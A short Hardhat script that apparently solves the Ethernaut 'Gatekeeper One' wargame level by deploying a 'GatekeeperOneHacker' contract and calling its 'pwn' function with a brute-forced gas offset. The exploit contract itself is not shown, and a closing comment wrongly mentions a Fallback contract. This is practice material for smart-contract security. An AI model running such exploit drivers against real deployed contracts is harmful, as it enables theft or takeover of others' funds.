// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
require('dotenv').config({ path: __dirname + '/.env' });

const { ethers } = require("hardhat");

async function main() {
    [player] = await ethers.getSigners();
    gatekeeperOne = await ethers.getContractAt("GatekeeperOne", process.env.GATEKEEPERONE_ADDRESS);
    hacker = await (await ethers.getContractFactory("GatekeeperOneHacker")).deploy();
    await hacker.deployed();
    transactionResponse = await hacker.pwn(process.env.GATEKEEPERONE_ADDRESS, 256); //256 was found out from test script
    await transactionResponse.wait();
    console.log("entrant of gatekeeperOne is", await gatekeeperOne.entrant());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
// run this script after Fallback contract was deployed
// npx hardhat run scripts/deploy.js --network goerli